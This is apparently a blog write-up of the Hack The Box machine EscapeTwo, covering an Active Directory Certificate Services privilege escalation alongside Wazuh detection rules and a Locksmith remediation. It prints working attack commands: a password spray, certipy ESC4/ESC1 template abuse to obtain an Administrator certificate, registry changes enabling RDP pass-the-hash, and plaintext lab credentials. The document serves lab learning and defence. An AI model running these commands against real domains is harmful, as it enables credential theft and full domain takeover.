---
title: EscapeTwo 
date: 2025-05-29 00:00:00 -0800
categories: [Patch the Box]
tags: [hack the box,windows,active directory,adcs,wazuh,sysmon,bloodhound,locksmith]
description: This is another assumed compromise Active Directory based box but the focus is on Certificate Services. I look at some ways to detect the attacks with various tools.
---

### Overview

This is an easy rated Hack The Box machine that benefits from knowledge of how Active Directory Certificate Services (AD CS) works and some of the well-known research by SpecterOps in their blog[^1] and whitepaper[^2]. The intent of this post is not to explain AD CS (the [references](#further-reading-and-watching) I used do that better than I) but I highlight areas that are relevant to what I worked on for this machine. BloodHound and certipy were primarily used for analyzing and abusing the AD CS portions while Wazuh was used to review aspects of those attacks from forwarded logs. 

### Attack Tactics

#### Credential Access
The password for the domain user `rose` is provided with this assumed compromise box. From there as is typical an `nmap` scan is ran and the ports open seem to align with a domain controller (53, 88, 389, 636, 3268, etc.), but 1433 is unusual so a mental note to check SQL Server is taken. I start using the credentials to check accessible shares with `nxc` (NetExec) and the "Accounting Department" share stands out.

![image](https://i.postimg.cc/Ls1KzCqL/escape2-accounting.png){: width='831' height='218'}

> __Detect:__ With Wazuh's default configuration this rule triggers for the remote logon connection:
{: .prompt-tip}

![image](https://i.postimg.cc/zfSpZK64/escape2-nxc-logon.png){: width='920' height='476'}

In the file share there were `.xlsx` files that seemed to be corrupted. Due to the structure of these files being compressed xml[^3] I unzipped them and viewed the contents, one of which included clear-text credentials. Example to view contents easily:

```bash
cat sharedStrings.xml | sed -e 's/<\//\n/g' | cut -f 4 -d '>' | sed -r '/^$/d'
```

I did a password spray and confirmed `oscar`'s account.

```bash
nxc smb $IP -u users.txt -p passwords.txt --continue-on-success
```

> __Detect:__ Wazuh rules again were able to detect logon failures as well as groupings of multiple attempts:
{: .prompt-tip}

![image](https://i.postimg.cc/C1w0SC18/escape2-pwd-spray.png){: width='897' height='394'}

#### Initial Access

The other interesting account recovered from the discovered credentials was the `sa` user. Using Impacket's `mssqlclient` I was able to gain initial access and obtain a reverse shell as the `sql_svc` domain user. Below I was using three panes, the top the Impacket initial connection, the middle running a python script to output a TCP reverse shell command (which is formatted and copied into the `mssqlclient` pane after enabling `xp_cmdshell`), and the bottom pane receives the reverse shell:

![image](https://i.postimg.cc/7hVMjkR7/escape2-rev-shell.png){: width='1127' height='716'}

> __Detect:__ Nothing stealthy here, but is detected with assistance from Sysmon:
{: .prompt-tip}

![image](https://i.postimg.cc/rmT4THx9/escape2-rev-shell-detection.png){: width='793' height='695'}

After spending some time searching through the file system the `C:\SQL2019` folder had an `.ini` file with the password for the `sql_svc` account. Conducting another password spray also verified credential re-use as it was also valid for `ryan`'s account.

##### Failed Attempts

Up to this point there were several other things I tried that either didn't help to progress me further at all or only helped after a modification. I'm listing some of these for reference in my thought process:

- Enumerating the database seemed to only have default tables.
- Initial look at SMB showed two accounting xlsx files but the data seemed to be corrupt.
- After using `xp_dirtree` and getting a hash the `sql_svc` net-ntlm wasn't cracking with the rockyou wordlist.
- `sql_svc` and `ca_svc` were shown as Kerberoastable but weren't cracking with the rockyou wordlist.
- WinRM access with `rose`'s credentials did not work.
- `certipy find -u 'rose@sequel.htb' -p 'KxEPkKe6R8su' -dc-ip $IP -vulnerable -stdout`

#### Discovery

Using BloodHound and now having access to `ryan`'s password I could see that he had the `WriteOwner` privilege over the `ca_svc` account. The Linux Abuse notes detail a method of changing ownership and adding `GenericAll` permissions with Impacket. I opted to use `bloodyAD` and then change `ca_svc`'s password:

![image](https://i.postimg.cc/XYRGcvNJ/escape2-writeowner.png){: width='1038' height='491'}

![image](https://i.postimg.cc/5t2Ggfsh/escape2-bloodyad.png){: width='852' height='185'}

> __Detect:__ Remote Logon rules trigger for these connections as well as the notable password change showing `ca_svc` as the Target UserName. The `Password Last Set` value of the message field includes the timestamp when the change occurred:
{: .prompt-tip}

![image](https://i.postimg.cc/sfLhDKF7/escape2-pwd-changed.png){: width='778' height='377'}

Certipy is then used with the `ca_svc` account:

```bash
certipy find -u 'ca_svc@sequel.htb' -p 'P@ssword1' -dc-ip $IP -vulnerable -stdout
```

The output it provides indicates an ESC4 issue and specifically that "'Cert Publishers' has dangerous permissions". This was also checked in BloodHound showing an attack path from the `ca_svc` account, to the "Cert Publishers" group, and then to the "DunderMifflinAuthentication" template.

![image](https://i.postimg.cc/yxfdt1Fw/escape2-esc4.png){: width='1129' height='401'}

#### Privilege Escalation

With the ESC4 misconfiguration in mind a combination of commands[^4] with `certipy` allows a template modification, this allows an ESC1 attack to get a certificate as the `Administrator` account, and this is then used to get the TGT and NT hash for the account which was ultimately used via pass the hash techniques.

```bash
certipy template -dc-ip $IP -u ca_svc -p 'P@ssword1' -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
certipy req -ca sequel-DC01-CA -dc-ip $IP -u ca_svc -p 'P@ssword1' -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
certipy auth -pfx administrator.pfx
```

![image](https://i.postimg.cc/ZKxQp9Tb/escape2-certipy.png){: width='1057' height='377'}

> __Detect:__ With Security event logs being sent to Wazuh a pair of EventIDs log when AD CS gets a certificate request and issues a certificate, 4886 and 4887:
{: .prompt-tip}

To get rules to trigger in Wazuh for these events first I used a `certutil` command noted by the Locksmith tool[^5]:

```
certutil.exe -config 'DC01.sequel.htb\sequel-DC01-CA' -setreg CA\AuditFilter 127
```

Then from the Group Policy Editor `gpedit.msc` I enabled the Audit Policy's "Audit object access" settings for both Success and Failure events, followed by restarting the service:

![image](https://i.postimg.cc/gJWyQyzn/escape2-audit-policy.png){: width='496' height='436'}

```powershell
Restart-Service -Name CertSvc
```

These two rules were then created in Wazuh for each of the EventIDs. The details in the logged events indicate which template is involved along with the Subject Alternative Name (SAN), in this case showing that the `administrator` UPN was specified:

```
<group name="windows,adcs">
  <rule id="190004" level="9">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID" type="pcre2">^4886$</field>
    <description>Possible AD CS tampering: Received a certificate request.</description>
  </rule>
</group>

<group name="windows,adcs">
  <rule id="190005" level="9">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID" type="pcre2">^4887$</field>
    <description>Possible AD CS tampering: Approved a certificate request and issued a certificate.</description>
  </rule>
</group>
```

![image](https://i.postimg.cc/Zn16P6Mb/escape2-adcs-desc.png){: width='793' height='104'}

![image](https://i.postimg.cc/v8j7ddHJ/escape2-4887.png){: width='828' height='602'}

![image](https://i.postimg.cc/ZY97NH9h/escape2-4886.png){: width='821' height='431'}

### Trying Locksmith

I wanted to try out this tool[^6] primarily because it not only provides identification of the ESC misconfigurations but commandline fixes as well. I opened up RDP so I could look at settings easier and see the output's available coloring. 

I used the `Administrator` account for the RDP session, the last part for RestrictedAdmin allows for pass-the-hash to work with `xfreerdp`:

```
net localgroup "Remote Desktop Users" administrator /add; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:$IP /u:administrator /pth:7a8d4e04986afa8ed4060f75e5a0b3ff /cert:ignore /dynamic-resolution
```

When initially running this, I was not seeing the ESC4 vulnerability, only references to ESC15[^7]. From what I could tell it looks like `Invoke-Locksmith` excludes[^8] privileged users and groups since their inherent privileges could allow for misconfigurations, unintended or not. "Cert Publishers" is a built-in group for computers hosting a CA and are authorized to publish certificates[^9]. To test this out I removed the references to `517` in the script and re-ran which then uncovered the ESC4 vector:

![image](https://i.postimg.cc/FRxTrCzM/escape2-locksmith.png){: width='1020' height='735'}

When I instead answered "n" to the first question about Cert Publishers administering the template it asks a follow up question if Cert Publishers need to Enroll and/or AutoEnroll in the template-answering "Unsure" for example the "Issue" is more specific and includes a "Fix": 

![image](https://i.postimg.cc/7YDZwSbT/escape2-fix.png){: width='1287' height='588'}

Provided fix:

```powershell
$Path = 'AD:CN=DunderMifflinAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb'
$ACL = Get-Acl -Path $Path
$IdentityReference = [System.Security.Principal.NTAccount]::New('SEQUEL\Cert Publishers')
$EnrollGuid = [System.Guid]::New('0e10c968-78fb-11d2-90d4-00c04f79dc55')
$AutoEnrollGuid = [System.Guid]::New('a05b8cc2-17bc-4802-a710-e7c15ab866a2')
$ExtendedRight = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
$AccessType = [System.Security.AccessControl.AccessControlType]::Allow
$InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
$EnrollRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, $ExtendedRight, $AccessType, $EnrollGuid, $InheritanceType
$AutoEnrollRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, $ExtendedRight, $AccessType, $AutoEnrollGuid, $InheritanceType
foreach ( $ace in $ACL.access ) {
    if ( ($ace.IdentityReference.Value -like 'SEQUEL\Cert Publishers' ) -and ( $ace.ActiveDirectoryRights -notmatch '^ExtendedRight$') ) {
        $ACL.RemoveAccessRule($ace) | Out-Null
    }
}
$ACL.AddAccessRule($EnrollRule)
$ACL.AddAccessRule($AutoEnrollRule)
Set-Acl -Path $Path -AclObject $ACL
```

For this to work I had to first explicitly add `Import-Module ActiveDirectory` to load the `AD` drive[^10]. Within the Certificate Templates snap-in from the mmc console I was able to confirm the changes made (removing Full Control, Read, and Write permissions from Cert Publishers). `certipy` also no longer found the template vulnerable when ran with the `ca_svc` account.

![image](https://i.postimg.cc/G25G6qbY/escape2-mmc.png){: width='392' height='493'}

### Further Reading and Watching
- [Microsoft - What is Active Directory Certificate Services?](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
- [SpecterOps - Certified Pre-Owned Medium Post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [BHIS - Abusing AD CS – Part 1](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
- [Certipy](https://github.com/ly4k/Certipy)
- [Andy Robbins & Jonas Knudsen - Analyzing and Executing AD CS Attack Paths with BloodHound](https://www.youtube.com/watch?v=u35nj0K9IjU)
- [Jake Hildreth - Finding and Fixing AD CS Issues with Locksmith](https://www.youtube.com/live/e3zW3Xdn9VE)
- [Tim Medin - Active Directory Certificate Services](https://www.youtube.com/watch?v=m3bmTVp6XKQ&t=730s)

#### Footnotes
[^1]: [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
[^2]: [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
[^3]: [https://uc3.cdlib.org/2012/02/16/whats-the-deal-with-xlsx/](https://uc3.cdlib.org/2012/02/16/whats-the-deal-with-xlsx/)
[^4]: [https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/)
[^5]: [https://github.com/jakehildreth/Locksmith/blob/main/Invoke-Locksmith.ps1#L183](https://github.com/jakehildreth/Locksmith/blob/main/Invoke-Locksmith.ps1#L183)
[^6]: [https://github.com/jakehildreth/Locksmith](https://github.com/jakehildreth/Locksmith)
[^7]: [https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
[^8]: [https://github.com/jakehildreth/Locksmith/blob/main/Invoke-Locksmith.ps1#L1008C19-L1008C34](https://github.com/jakehildreth/Locksmith/blob/main/Invoke-Locksmith.ps1#L1008C19-L1008C34)
[^9]: [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids)
[^10]: [https://devblogs.microsoft.com/powershell-community/understanding-get-acl-and-ad-drive-output/#reading-active-directory-permission-using-get-acl](https://devblogs.microsoft.com/powershell-community/understanding-get-acl-and-ad-drive-output/#reading-active-directory-permission-using-get-acl)
